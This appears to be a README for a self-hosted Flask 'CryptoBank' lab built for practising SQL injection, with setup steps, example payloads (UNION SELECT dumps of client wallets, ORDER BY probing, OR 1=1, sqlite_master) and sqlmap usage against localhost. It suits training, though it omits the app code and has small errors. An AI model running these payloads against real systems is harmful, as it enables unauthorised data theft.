# CryptoBank-SQL-Injection-Lab
 Flask-based CryptoBank SQL Injection Lab to practice error-based SQLi and UNION SQLi.


📦 Prerequisites:
Python (preferably 3.6 or higher)

Visual Studio Code (VSCode) (with Python support)

Flask (Python web framework)

SQLite (for the database)



🏗️ Step 1: Install Python & Required Modules
If you don't have Python installed yet, download Python here and make sure to add Python to your PATH during installation.

Install Python

Install Flask:

Open VSCode or your terminal.

Install Flask and SQLite3 dependencies using pip:



pip install flask sqlite3

🧑‍💻 Step 2: Set Up the Project

Open VSCode.

Create a new folder for your project, e.g., sqli_lab.

Inside the folder, create a file named cryptobank_sqli_lab.py.

Paste the Flask app code from the previous responses into this file.

💾 Save Your Project
Your directory should look like this:


sqli_lab/
│
└── cryptobank_sqli_lab.py
🚀 Step 3: Run the Lab in VSCode Terminal

python cryptobank_sqli_lab.py



This will run the server on http://127.0.0.1:5000/.

You should see output like this in the terminal:




* Running on http://127.0.0.1:5000
🌐 Step 4: Open the Lab in Your Browser

Open your web browser.


Go to:

http://127.0.0.1:5000/




You should see the CryptoBank Data Lookup page with a black background.




🧑‍💻 Step 5: Testing for SQL Injection
On the CryptoBank page, you’ll see a search bar labeled "Client name".

Enter an SQL Injection payload into the search bar (like ' UNION SELECT 1, name, balance, wallet FROM clients--).


The output should display the data from the clients table:


ID: 1, Name: Alice, Balance: 3.2 BTC, Wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

ID: 2, Name: Bob, Balance: 5.5 BTC, Wallet: 3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy

ID: 3, Name: Eve, Balance: 0.01 BTC, Wallet: bc1qw508d6qejxtdg4y5r3zarvary0c5xw7k6j28z





⚙️ Step 6: Hacking the Lab
Now you're ready to start testing for vulnerabilities and executing SQL injection payloads. Here's what you can try:

Example SQLi payloads:

Simple UNION SELECT (to get the data from the clients table):

' UNION SELECT 1, name, balance, wallet FROM clients--

Find number of columns (if you're unsure):

pgsql
Kopieren
Bearbeiten
' ORDER BY 1--        ✅
' ORDER BY 2--        ✅
' ORDER BY 3--        ✅
' ORDER BY 4--        ❌ (error!)
Blind SQLi or Advanced Payloads:

' OR 1=1--

' UNION SELECT 1, sql, 3 FROM sqlite_master-- (to dump table names)

📖 Step 7: Automate with Burp Suite or SQLmap
If you want to automate testing, you can use tools like Burp Suite or SQLmap.

Using Burp Suite:
Set up Burp Suite and configure it to proxy your browser traffic.

Intercept the request to /search?name=<input> and modify the parameter to inject SQLi payloads.

Test different payloads to see how the application reacts (e.g., error messages or data dumps).

Using SQLmap:
Install SQLmap on your machine:


git clone https://github.com/sqlmapproject/sqlmap.git

cd sqlmap

Run the following to test SQL injection:


python sqlmap.py -u "http://127.0.0.1:5000/search?name=' OR 1=1--" --batch

SQLmap will try to automate detection and exploitation of SQLi vulnerabilities.

📝 Additional Notes:
Security Best Practices: This is a vulnerable app for educational purposes. In a real-world application, always sanitize user inputs (use prepared statements, parameterized 

queries, or ORM libraries).

Next Steps: You can add more features (e.g., transaction history, admin panel) to expand the vulnerability testing.
